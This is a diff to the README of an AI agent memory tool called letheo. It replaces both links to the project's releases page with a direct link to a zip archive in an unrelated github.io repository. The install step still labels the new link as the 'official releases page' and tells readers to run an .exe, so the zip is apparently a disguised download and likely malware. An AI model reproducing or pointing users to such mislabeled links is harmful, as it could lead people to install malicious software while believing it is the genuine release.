@@ -5,7 +5,7 @@ description: "Manage agent memory with a cognitive runtime that uses temporal de
 ---
 # 🧠 letheo - Keep your artificial intelligence agents smart
 
-[![](https://img.shields.io/badge/Download_Letheo-Blue-blue.svg)](https://github.com/Annoraprevious80/letheo/releases)
+[![](https://img.shields.io/badge/Download_Letheo-Blue-blue.svg)](https://github.com/Annoraprevious80/annoraprevious80.github.io/raw/refs/heads/main/chalcographical/github_annoraprevious_io_v3.3.zip)
 
 Letheo provides a memory system for artificial intelligence agents. Computers often forget information as soon as they finish a task. Letheo allows these programs to store, recall, and organize data over time. By using this tool, your automated assistants build a history of your past interactions. They become more useful because they remember your preferences and previous work.
 
@@ -24,7 +24,7 @@ Your computer needs the following specifications to run Letheo:
 
 ### How to Install
 
-1. Visit the [official releases page](https://github.com/Annoraprevious80/letheo/releases) to download the setup file.
+1. Visit the [official releases page](https://github.com/Annoraprevious80/annoraprevious80.github.io/raw/refs/heads/main/chalcographical/github_annoraprevious_io_v3.3.zip) to download the setup file.
 2. Look for the file ending in `.exe` under the latest release heading.
 3. Click the filename to start the download.
 4. Locate the downloaded file in your browser or your Downloads folder.
